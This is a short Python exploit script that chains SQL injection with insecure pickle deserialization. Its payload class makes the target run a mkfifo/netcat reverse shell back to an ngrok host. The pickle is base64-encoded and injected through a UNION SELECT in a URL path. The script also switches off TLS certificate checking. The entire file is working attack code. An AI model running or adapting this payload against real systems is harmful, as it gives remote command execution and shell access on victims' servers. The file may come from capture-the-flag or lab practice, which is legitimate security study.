# Pickle module exploit (pickle.dumps & pickle.loads) with a little bit of sql injeciton

import sys
import base64
import pickle
import pickletools
import urllib.parse
import ssl
import requests

ssl._create_default_https_context = ssl._create_unverified_context
requests.packages.urllib3.disable_warnings()

class Payload:

  def __reduce__(self):

    import os

    cmd = ("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f"

      "| /bin/sh -i 2>&1 | nc 2.tcp.ngrok.io 17902 >/tmp/f")


    return os.system, (cmd,)



if __name__ == "__main__":

  payload_p = pickle.dumps(Payload())

  pickletools.dis(payload_p)

  payload_b64 = base64.b64encode(payload_p).decode()



  ip,port = "1.2.3.4",1234

  uri_path = "' UNION SELECT '%s' -- "%payload_b64

  uri_path_s = requests.utils.requote_uri(uri_path)

  uri = "http://%s:%d/view/%s"%(ip,port,uri_path_s)

  print(uri)
